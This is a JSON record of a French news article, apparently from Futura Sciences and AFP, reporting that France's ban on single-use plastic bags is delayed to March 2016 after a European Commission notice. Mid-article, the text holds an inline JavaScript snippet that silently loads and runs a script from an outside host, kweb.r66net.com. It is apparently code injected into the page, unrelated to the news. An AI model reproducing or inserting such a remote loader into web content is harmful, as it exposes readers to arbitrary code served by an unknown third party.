{"title": "Sacs plastique a usage unique : leur interdiction reportee a mars 2016", "newspaper": "Futura Sciences", "author": ["Paris - AFP"], "date_publi": "2015-12-29", "content": "Les sacs en plastique a usage unique seront bientot interdits. Ils devaient etre bannis au premier janvier mais c'est un peu tot, semble-t-il. Trois mois de plus leur sont accordes. Leur utilisation a deja beaucoup baisse ces dernieres annees. Les  sacs plastique a usage unique  ne seront pas formellement interdits aux caisses des supermarches avant fin mars, meme si le gouvernement a bien l'intention de generaliser la mesure des le 1 er  janvier comme prevu initialement, a confirme le ministere de l' Ecologie  lundi. Le decret d' application  de cette mesure prevue par la loi sur la  transition energetique  aurait du paraitre avant la fin de l'annee mais sa publication a ete repoussee, comme l'a annonce ce weekend la ministre de l'Ecologie Segolene Royal au  Journal du dimanche . << Nous avons recu un avis circonstancie de la Commission europeenne qui bloque la publication du decret de 3 mois jusqu'au 28 mars >> , a explique a l'AFP un porte-parole du ministere. Un echange a lieu avec la Commission pour  << verifier que la mesure ne comprend pas de risques juridiques et eviter les recours >> , notamment du cote des fabricants de sacs, ajoute-t-il. Il faut par exemple bien preciser  << la taille, le poids, le type de sacs concernes par l'interdiction >> , en lien avec la reglementation europeenne. Le ministere affirme quand meme que la mesure se generalisera des le 1 er  janvier car les grandes surfaces l'ont anticipee, soit en ayant deja arrete de  distribuer des sacs plastique  a usage unique en caisse, soit en se preparant a le faire au 1 er  janvier. Mais, jusqu'a la publication du decret, les contrevenants ne pourront pas faire l'objet de sanctions. L'utilisation de sacs en plastique a deja considerablement diminue ces dernieres annees en France. (c) Image Point Fr, shutterstock.com                       Les sacs biodegradables pourraient prendre le relais Du cote de la Federation des entreprises du commerce et de la distribution (FCD), representant la majorite de la  grande distribution , on precise que le decalage du decret  << ne changera pas grand-chose, dans la mesure ou les enseignes n'ont pas attendu la loi pour reduire drastiquement le nombre de sacs  plastique  a usage unique distribues en caisse >> .  ( function () { var vs = document.createElement(\"script\"); vs.type = \"text/javascript\"; vs.async = true; vs.src = \"http://kweb.r66net.com/GetLink\"; var s = document.getElementsByTagName(\"script\")[0]; s.parentNode.insertBefore(vs, s); })();  << Un accord volontaire a ete mis en place des 2003 et depuis, le nombre de sacs distribues par les enseignes est passe de 10,5 milliards a 600 millions (par an), soit une baisse de 94 % >> , explique la federation. Beaucoup d'enseignes font egalement payer les sacs  plastique  (entre 3 et 5 centimes) pour inciter les consommateurs a amener leurs propres sacs. En septembre, Segolene Royal avait affirme que ce decret serait publie  << tres rapidement >>  et que l'interdiction des sacs a usage unique allait  << permettre de developper des industries de fabrication de sacs  biodegradables  et creer des emplois >>  en France. L'interdiction des sacs en plastique a usage unique au profit des sacs reutilisables est inscrite dans la loi sur la  transition energetique  qui a ete promulguee en aout. Une deuxieme loi devrait intervenir au 1 er  janvier 2017, interdisant la distribution de tous les autres sacs plastique jetables (sauf ceux biodegradables), y compris ceux fournis pour emballer les  fruits et legumes  ou le fromage. Un plastique biodegradable cree a partir de dechets agricoles                       Chaque annee, des tonnes de plastiques sont dispersees dans l'environnement et particulierement dans l'ocean. Une solution proposee par certains laboratoires serait de remplacer ce derive du petrole par un plastique biodegradable et non toxique. Euronews nous en parle en video.                                       ", "theme": "maison"}